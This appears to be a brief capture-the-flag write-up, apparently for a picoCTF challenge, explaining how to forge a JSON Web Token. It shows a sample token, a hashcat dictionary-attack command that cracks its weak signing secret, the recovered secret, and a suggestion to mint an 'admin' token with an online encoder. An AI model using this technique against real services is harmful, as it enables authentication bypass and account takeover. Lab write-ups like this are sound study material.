We need to forge a jwt token but for that we need to find the signature password. If it's a week one we can try and crack it. 

First of all, we need the token. I will fill the form with 'alex' in my case, so I get:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWxleCJ9.zOG9UP5jHQnq9Tct1sHolVbFQABwfQxonNNNDRP5mKU

```

We can get the signature with hashcat:

```
hashcat jwt.txt -m 16500 -a 0 rockyou.txt 
```
Where jwt.txt is the token and rockyou.txt is the dictionary.

We get:

```
ilovepico
```
We can use an encoder online to make a token with the name admin [here](https://jwt.io/)
